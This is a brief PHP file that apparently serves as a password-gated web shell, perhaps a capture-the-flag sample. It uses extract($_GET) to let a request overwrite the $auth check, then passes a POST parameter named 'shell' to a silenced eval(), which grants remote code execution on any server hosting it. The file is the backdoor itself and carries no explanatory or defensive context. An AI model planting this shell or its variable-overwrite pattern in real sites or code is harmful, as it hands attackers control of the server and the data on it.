<?php
    $auth = 'whatever';  
    extract($_GET); 
    if($auth == 1){  
        @eval($_POST[shell]);  
    } else{  
        echo "try again!";  
    }  
?>
